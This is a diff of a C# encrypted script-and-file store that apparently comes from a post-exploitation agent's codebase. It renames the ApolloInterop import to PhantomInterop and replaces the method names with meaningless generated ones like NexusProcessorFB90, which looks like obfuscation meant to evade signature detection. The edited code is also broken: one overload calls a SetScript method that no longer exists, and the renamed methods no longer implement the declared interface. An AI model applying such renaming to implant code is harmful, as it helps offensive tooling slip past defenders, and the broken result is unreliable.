@@ -1,10 +1,10 @@
-﻿using ApolloInterop.Interfaces;
+﻿using PhantomInterop.Interfaces;
 using System.Collections.Concurrent;
 using System.Text;
 
 namespace EncryptedFileStore
 {
-    public class EncryptedFileStore : IEncryptedFileStore
+    public class EfficientMonitorA29E : IEncryptedFileStore
     {
         protected byte[] CurrentScript = new byte[0];
         protected readonly ConcurrentDictionary<string, byte[]> FileStore = new ConcurrentDictionary<string, byte[]>();
@@ -35,7 +35,7 @@ namespace EncryptedFileStore
             return plainText;
         }
 
-        public string GetScript()
+        public string NexusProcessorFB90()
         {
             if (CurrentScript.Length == 0)
             {
@@ -44,17 +44,17 @@ namespace EncryptedFileStore
             return Encoding.UTF8.GetString(DecryptData(CurrentScript));
         }
 
-        public void SetScript(string script)
+        public void EfficientTracker1FD0(string script)
         {
             SetScript(Encoding.UTF8.GetBytes(script));
         }
 
-        public void SetScript(byte[] script)
+        public void EfficientTracker1FD0(byte[] script)
         {
             CurrentScript = EncryptData(script);
         }
 
-        public bool TryAddOrUpdate(string keyName, byte[] data)
+        public bool EnhancedController6FDE(string keyName, byte[] data)
         {
             byte[] encData = EncryptData(data);
             if (FileStore.TryAdd(keyName, encData))
@@ -71,7 +71,7 @@ namespace EncryptedFileStore
             }
         }
 
-        public bool TryGetValue(string keyName, out byte[] data)
+        public bool RobustWorker592C(string keyName, out byte[] data)
         {
             if (FileStore.TryGetValue(keyName, out data))
             {
